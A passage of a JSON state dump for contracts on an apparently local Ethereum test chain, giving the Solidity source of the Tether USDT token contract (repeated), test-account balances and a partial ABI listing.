}\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0xDb56f2e9369E0D7bD191099125a3f6C370F8ed15",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0xDb56f2e9369E0D7bD191099125a3f6C370F8ed15": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99744397880000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0xA94B7f0465E98609391C623d0560C5720a3f2D33",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            